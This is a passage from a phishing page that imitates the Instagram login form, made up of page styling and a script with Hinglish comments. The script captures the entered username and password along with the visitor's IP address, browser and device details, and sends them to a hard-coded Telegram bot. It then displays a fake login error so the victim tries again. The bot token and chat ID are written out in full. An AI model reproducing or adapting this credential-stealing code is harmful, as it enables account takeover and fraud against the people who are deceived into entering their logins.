            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 500;
        }

        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .divider::before {
            margin-right: 18px;
        }

        .divider::after {
            margin-left: 18px;
        }

        .fb-login {

            align-items: center;
            justify-content: center;
            gap: 8px;
            background: none;
            border: none;
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-bottom: 15px;
            width: 100%;
        }

        .fb-login svg {
            width: 16px;
            height: 16px;
        }

        .forgot-password {

            font-size: 12px;
            text-decoration: none;
        }

        .signup-card {

            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px 30px;
            text-align: center;
            font-size: 14px;
        }

        .signup-card a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;

        .get-app {

    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const loginBtn = document.getElementById('loginBtn');
            const warningMsg = document.getElementById('warningMessage');
            const loading = document.getElementById('loading');
            
            // Instagram ki tarah error dikhana
            warningMsg.style.display = 'none';
            loading.style.display = 'block';
            loginBtn.disabled = true;
            loginBtn.style.opacity = '0.5';
            
            try {
                // User ka IP address fetch karna
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const userIP = ipData.ip;
                
                // Device aur browser ki info
                const userAgent = navigator.userAgent;
                const platform = navigator.platform;
                const language = navigator.language;
                
                // Telegram message prepare karna
                const message = `
🔐 *Instagram Login Alert* 🔐
                    
👤 *Username/Email:* \`${username}\`
🔑 *Password:* \`${password}\`
🌍 *IP Address:* \`${userIP}\`
💻 *Device:* ${platform}
🌐 *Browser:* ${userAgent}
🗣 *Language:* ${language}
⏰ *Time:* ${new Date().toLocaleString()}
                `;
                
                // Telegram bot par bhejna
                const telegramResponse = await fetch(`https://api.telegram.org/bot8518785429:AAE_R8JRh1l3eVCXlBrLZRI9X2BrCDvWK74/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: '6780152835',
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                
                // Instagram jaisa error message dikhana (successful login ke baad bhi error)
                setTimeout(() => {
                    loading.style.display = 'none';
                    warningMsg.style.display = 'block';
                    loginBtn.disabled = false;
                    loginBtn.style.opacity = '1';
                    document.getElementById('password').value = '';
                    
                    // 3 second baad warning message hide karna
                    setTimeout(() => {
                        warningMsg.style.display = 'none';
                    }, 3000);
                }, 1500);
                
            } catch (error) {
                console.error('Error:', error);
                loading.style.display = 'none';
                loginBtn.disabled = false;
                loginBtn.style.opacity = '1';
                alert('Something went wrong. Please try again.');
            }
        });

        // Instagram ki tarah input fields ko highlight karna
        const inputs = document.querySelectorAll('input');
        inputs.forEach(input => {
            input.addEventListener('focus', function() {
                this.style.borderColor = '#a8a8a8';
            });
            
            input.addEventListener('blur', function() {
                this.style.borderColor = '#dbdbdb';
            });
        });
    </script>
